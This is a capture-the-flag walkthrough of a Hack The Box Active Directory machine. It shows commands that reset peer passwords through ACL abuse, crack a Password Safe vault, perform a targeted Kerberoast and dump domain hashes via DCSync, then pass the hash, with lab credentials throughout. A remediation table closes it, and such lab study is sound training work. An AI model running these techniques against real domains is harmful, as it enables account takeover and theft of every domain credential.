# Administrator — An assumed-breach ACL chain from one low-priv user to DCSync

[![Difficulty](https://img.shields.io/badge/difficulty-Medium-yellow)](https://app.hackthebox.com/machines/administrator)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/administrator)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=Miam4nw9pmE)

> **Attack path:** olivia (given creds) → BloodHound → GenericAll reset on michael → ForceChangePassword on benjamin → FTP `Backup.psafe3` → Password Safe vault → emily → GenericWrite / targeted Kerberoast on ethan → DCSync → Domain Admin.

Note: HTB lists this box as **Medium** difficulty (it is an "assume breach" scenario — you start with credentials), even though the full chain is long. Every step is a pure Active Directory misconfiguration: no exploit or memory corruption involved.

## 1 · Reconnaissance

### Port scan

```bash
echo "10.10.11.42 administrator.htb dc.administrator.htb" | sudo tee -a /etc/hosts

nmap -p- --min-rate 10000 -oN administrator-allports 10.10.11.42
nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV \
    -oN administrator-tcpsvc 10.10.11.42
```

The target is the domain controller for `administrator.htb` (Windows Server 2022, hostname `DC`): DNS, Kerberos, LDAP/LDAPS, SMB, WinRM (5985), ADWS — and, unusually for a DC, **FTP on port 21**.

### Validate the given credentials

The box hands you `olivia : ichliebedich` (an "assume breach" starting point). Confirm it works over SMB and WinRM:

```bash
nxc smb administrator.htb -u olivia -p ichliebedich
nxc winrm administrator.htb -u olivia -p ichliebedich
```

olivia is a member of **Remote Management Users**, so the credentials already give a shell — but the point of this box is the ACL path to Domain Admin.

### BloodHound collection

```bash
bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich \
    -ns 10.10.11.42 --zip
```

Load the zip into BloodHound (the CE collector/edition pairing works well here). The interesting edges:

- `olivia` has **GenericAll** on `michael`
- `michael` has **ForceChangePassword** on `benjamin`
- `benjamin` is a member of **Share Moderators** (the group behind the FTP service)
- `emily` has **GenericWrite** on `ethan`
- `ethan` holds **DS-Replication-Get-Changes / Get-Changes-All** on the domain — i.e. DCSync rights

That is a five-hop ladder from olivia to domain compromise.

## 2 · Foothold

```bash
evil-winrm -i administrator.htb -u olivia -p ichliebedich
```

As olivia there is nothing of interest on the box itself — the whole game is in the directory. Start walking the BloodHound chain.

### olivia → michael (GenericAll)

Full control of the object includes the right to reset the password:

```bash
net rpc password "michael" 'N3wP@ssw0rd!' \
    -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42
```

michael is also in Remote Management Users, so `evil-winrm -u michael` works with the new password.

### michael → benjamin (ForceChangePassword)

Same technique, one hop down:

```bash
net rpc password "benjamin" 'N3wP@ssw0rd!' \
    -U "administrator.htb"/"michael"%"N3wP@ssw0rd!" -S 10.10.11.42
```

benjamin has no WinRM rights, but via the Share Moderators group he can authenticate to **FTP** — the odd port 21 on the DC.

## 3 · User flag

### Crack the Password Safe vault

Over FTP as benjamin there is one file, `Backup.psafe3`:

```bash
ftp administrator.htb          # user: benjamin
ftp> get Backup.psafe3

pwsafe2john Backup.psafe3 > psafe.hash
hashcat -m 5200 psafe.hash /usr/share/wordlists/rockyou.txt
```

The safe password cracks to `tekieromucho`. Open the vault in Password Safe (or `pwsafe` on Linux): it holds three entries — alexander, emily, emma. Spray them against the domain:

```bash
nxc smb administrator.htb -u emily -p '<vault-password>' --continue-on-success
```

Only **emily** is valid (SMB and WinRM), with password `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`:

```bash
evil-winrm -i administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
*Evil-WinRM* PS C:\Users\emily\Documents> type ..\Desktop\user.txt
<user_flag>
```

## 4 · Privilege escalation

### emily → ethan (GenericWrite / targeted Kerberoast)

GenericWrite on a user allows adding an SPN, requesting a TGS for it, then removing it — the "targeted Kerberoast" (ShutdownRepo's tool automates the loop). Sync your clock first, Kerberos is picky:

```bash
sudo ntpdate administrator.htb

uv run targetedKerberoast.py -v -d administrator.htb \
    -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

It prints a `$krb5tgs$23$*ethan...` hash; crack it:

```bash
hashcat -m 13100 ethan.tgs /usr/share/wordlists/rockyou.txt
```

ethan's password is `limpbizkit`. ethan has no WinRM access, but he does not need it — his account holds replication rights on the domain.

## 5 · Root flag / Domain Admin

### DCSync as ethan

```bash
impacket-secretsdump ethan:limpbizkit@dc.administrator.htb
```

The dump contains the Administrator NTLM hash (`3dc553ce4b9fd20bd016e098d2d2fd2e`). Pass-the-hash straight in:

```bash
evil-winrm -i dc.administrator.htb -u administrator \
    -H 3dc553ce4b9fd20bd016e098d2d2fd2e
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
<root_flag>
```

Domain compromised — every account in the NTDS dump is now replayable.

## 6 · Impact & remediation

| Risk | Impact | Remediation |
|------|--------|-------------|
| Password resets via GenericAll / ForceChangePassword | Any holder of these ACLs can silently take over a peer account (olivia → michael → benjamin) | Audit ACLs with BloodHound, remove broad write/reset rights from non-admin principals |
| Password vault (`psafe3`) stored on an FTP share | One crackable master password exposes every stored credential (emily) | Never store password vaults on file shares; use a managed enterprise secrets platform |
| Password reuse across service accounts | emily's vault entry matched her AD account; kerberoastable ethan fell to rockyou | Enforce unique, high-entropy service passwords; remove SPNs from user accounts where unneeded |
| Unconstrained replication rights (DS-Replication-Get-Changes-All) on ethan | Direct DCSync = full domain credential dump | Grant replication rights only to Domain Controllers / protected admin accounts |
| FTP service on a domain controller | Extra attack surface that leaked the backup vault | Do not run FTP on a DC; decommission or move to a dedicated member server |

## 7 · CPTS takeaways

- Assume-breach boxes mirror the CPTS exam style: you often start with credentials and must enumerate ACLs, not ports. Run BloodHound immediately after validating creds.
- `net rpc password` is the fastest password-reset primitive for GenericAll / ForceChangePassword edges — no GUI tools needed.
- Offline vault cracking (`pwsafe2john` + hashcat 5200) is exam-realistic: always check file shares for KeePass/PasswordSafe artifacts.
- Targeted Kerberoast (GenericWrite → temporary SPN → TGS → revert) is a required technique for the AD set-piece exams.
- DCSync via `secretsdump` is the standard finisher once you own an account with replication rights — then PTH with evil-winrm for the shell.

Sources: 0xdf (https://0xdf.gitlab.io/2025/04/19/htb-administrator.html), Thomas Best (https://medium.com/@best.thomas0909/administrator-hackthebox-writeup-fb168fbb9380), jamarir (https://www.jamarir.com/blog/htb-administrator).
